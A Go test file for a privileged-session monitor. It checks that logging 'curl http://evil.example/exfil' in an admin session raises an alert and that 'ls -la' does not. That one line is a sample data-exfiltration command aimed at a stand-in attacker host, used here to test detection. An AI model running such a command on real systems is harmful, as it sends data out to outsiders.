package session

import "testing"

func TestPrivilegedSessionAlert(t *testing.T) {
	s := NewStore()
	rec := s.Start("admin", "prod-db-01")
	if alert, ok := s.LogCommand(rec.ID, "curl http://evil.example/exfil"); !ok || alert == nil {
		t.Fatal("expected alert")
	}
	if len(s.Alerts()) != 1 {
		t.Fatal("alert not stored")
	}
}

func TestBenignCommand(t *testing.T) {
	s := NewStore()
	rec := s.Start("admin", "host")
	if _, ok := s.LogCommand(rec.ID, "ls -la"); ok {
		t.Fatal("unexpected alert")
	}
}
